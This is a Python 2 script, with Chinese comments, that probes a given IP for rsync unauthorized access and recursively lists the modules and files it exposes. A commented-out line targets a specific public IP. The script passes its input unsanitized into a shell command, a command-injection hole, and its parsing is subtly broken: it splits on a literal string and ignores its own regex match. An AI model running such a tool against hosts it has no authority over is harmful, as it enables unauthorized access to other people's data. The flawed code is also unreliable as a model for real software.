#!/usr/bin/python
#-*- coding:utf-8 -*-

'''rsync未授权访问'''

import os,sys,re
import commands

def __test_rsyncunauth(ip, data = ' '):
    '''
    验证是否存在rsync未授权访问漏洞
    :param url:
    :return:
    '''
    cmd = 'rsync -av --timeout=5' + ip + "::" + data
    print cmd
    (status, resp) = commands.getstatusoutput('rsync -v --timeout=5 ' + ip + '::' + data)
    print resp
    if status == 0: #表示获取# 到敏感信息
        resp_dic = resp.split(' \t\n')
        #print re_result
        for item in resp_dic:
            print '######'
            print item
            re_result = re.search(r'[dwrx-]{10}\s+[\d]+\s+[\d]{4}\/[\d]{1,2}\/[\d]{1,2}\s+[0-5]\d:[0-5]\d:[0-5]\d\s+(.*)', item)
            print re_result
            print '######'
            if item != ' ':
                print item
                __test_rsyncunauth(ip, item[:item.find(' ')])

    return False

if __name__ == '__main__':
    #print __test_rsyncunauth('112.124.12.124')
    print __test_rsyncunauth(sys.argv[1])
